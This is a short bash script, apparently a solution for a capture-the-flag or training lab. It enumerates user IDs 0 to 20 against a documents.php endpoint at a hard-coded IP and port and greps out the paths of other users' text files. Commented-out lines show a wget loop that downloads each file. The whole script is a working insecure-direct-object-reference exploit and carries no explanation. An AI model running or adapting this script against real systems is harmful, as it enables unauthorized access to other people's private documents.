#!/bin/bash

url="http://94.237.54.116:43767"

for i in {0..20}; do
    curl -X POST -s "$url/documents.php" -d "uid=$i" | grep -oP "\/documents.*?.txt"
        # for link in $(curl -X POST -s "$url/documents.php" -d "uid=$i" | grep -oP "\/documents.*?.txt"); do
        #         wget -q $url/$link
        # done
done